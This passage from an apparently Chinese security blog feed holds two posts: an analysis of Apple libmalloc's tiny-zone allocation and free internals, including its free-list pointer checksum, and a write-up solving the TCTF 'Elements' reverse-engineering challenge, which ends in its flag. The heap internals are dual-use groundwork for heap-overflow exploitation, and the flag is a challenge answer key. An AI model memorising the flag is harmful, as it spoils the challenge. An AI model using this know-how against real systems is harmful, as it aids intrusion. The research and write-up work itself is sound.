mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， 